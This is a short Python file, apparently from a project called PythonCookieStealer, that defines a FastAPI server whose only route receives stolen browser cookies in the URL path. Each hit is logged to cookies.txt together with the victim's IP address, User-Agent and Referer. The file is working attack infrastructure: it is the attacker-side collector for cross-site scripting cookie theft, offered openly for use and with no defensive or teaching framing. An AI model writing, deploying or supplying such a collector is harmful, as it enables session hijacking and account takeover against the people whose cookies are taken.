#  __     __     ______     ______   __     ______     __   __    
# /\ \  _ \ \   /\  __ \   /\__  _\ /\ \   /\  __ \   /\ "-.\ \   
# \ \ \/ ".\ \  \ \  __ \  \/_/\ \/ \ \ \  \ \ \/\ \  \ \ \-.  \  
#  \ \__/".~\_\  \ \_\ \_\    \ \_\  \ \_\  \ \_____\  \ \_\\"\_\ 
#   \/_/   \/_/   \/_/\/_/     \/_/   \/_/   \/_____/   \/_/ \/_/ 
#       https://github.com/TheWation/PythonCookieStealer

from fastapi import FastAPI, Request
from datetime import datetime
app = FastAPI()

@app.get("/c/{cookie}")
def read_root(cookie: str, request: Request):
    with open(f'cookies.txt', 'a') as cookie_file:
        time_str = datetime.now().strftime("%Y/%m/%d %H:%M:%S")
        client_host = request.client.host
        user_agent = request.headers.get("User-Agent")
        referer = request.headers.get("Referer")
        cookie_file.write(f'[+] Date: {time_str}\n[+] IP: {client_host}\n[+] UserAgent: {user_agent}\n[+] Referer: {referer}\n[+] Cookies: {cookie}\n---\n')
    return {"status": 200}